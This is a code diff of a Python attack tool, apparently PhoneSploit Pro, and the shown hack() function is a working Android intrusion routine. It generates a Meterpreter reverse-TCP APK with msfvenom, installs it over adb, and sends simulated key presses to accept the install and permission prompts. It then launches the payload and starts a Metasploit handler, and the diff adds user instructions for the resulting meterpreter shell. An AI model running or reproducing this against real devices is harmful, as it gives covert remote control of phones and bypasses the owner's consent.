@@ -3,6 +3,8 @@ import random
 import socket
 import time
 from banner import banner_list
+from banner import instructions_banner
+from banner import hacking_banner
 
 
 def display_menu():
@@ -138,39 +140,75 @@ def reboot():
     os.system('adb reboot')
     print('\n')
 
+
 def get_ip_address():
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     s.connect(("8.8.8.8", 80))
     return s.getsockname()[0]
 
+
+def instructions():
+    os.system('clear')
+    instruction = '''
+
+This attack will launch Metasploit              i.e msfconsole
+
+Use 'Ctrl + C' to stop at any point
+
+1. Wait until you see:
+    
+    meterpreter >
+
+2. Then use 'help' command to see all meterpreter commands:
+
+    meterpreter > help
+
+3. To exit meterpreter or Metasploit enter 'exit -y':
+
+    meterpreter > exit -y
+
+    msf6 > exit -y
+     
+[PhoneSploit Pro]   Press 'Enter' to continue
+    '''
+    print(instructions_banner + instruction)
+    input('> ')
+
+
 def hack():
-    print(f"\nHACKING DEVICE...\n")
-    ip = get_ip_address() #getting IP Address to create payload
-    print(f"\nUsing IP Address : {ip}\n") 
-    print("\nCreating APK...\n") 
-    os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT=4444 > test.apk") #creaating payload
+    instructions()
+    print(hacking_banner)
+    ip = get_ip_address()  # getting IP Address to create payload
+    print(f"\nUsing IP Address : {ip} to create payload\n")
+    print("\nCreating APK...\n")
+    # creaating payload
+    os.system(
+        f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT=4444 > test.apk")
     print("\nInstalling APK to target device...\n")
-    os.system("adb install test.apk &") #installing apk to device (used & to execute command in background)
-    time.sleep(5) #waiting for apk to be installed
+    # installing apk to device (used & to execute command in background)
+    os.system("adb install test.apk &")
+    time.sleep(5)  # waiting for apk to be installed
 
     # Keyboard input to accept app install
-    print("\nSending touch 1\n")
+    print("\nSending input 1\n")
     os.system('adb shell input keyevent 20')
     os.system('adb shell input keyevent 20')
     os.system('adb shell input keyevent 66')
+
     print("\nLaunching app...\n")
-    package_name = "com.metasploit.stage" # payload package name
-    os.system("adb shell monkey -p " + package_name + " 1")    
-    time.sleep(3) # waiting for app to launch
-    
+    package_name = "com.metasploit.stage"  # payload package name
+    os.system("adb shell monkey -p " + package_name + " 1")
+    time.sleep(3)  # waiting for app to launch
+
     # Keyboard input to accept app permissions
-    print("\nSending touch 2\n")
+    print("\nSending input 2\n")
     os.system('adb shell input keyevent 22')
     os.system('adb shell input keyevent 22')
     os.system('adb shell input keyevent 66')
-    
+
     # Launching Metasploit
-    os.system(f"msfconsole -x 'use exploit/multi/handler ; set PAYLOAD android/meterpreter/reverse_tcp ; set LHOST {ip} ; set LPORT 4444 ; exploit'" )
+    os.system(
+        f"msfconsole -x 'use exploit/multi/handler ; set PAYLOAD android/meterpreter/reverse_tcp ; set LHOST {ip} ; set LPORT 4444 ; exploit ; help'")
 
 
 def main():
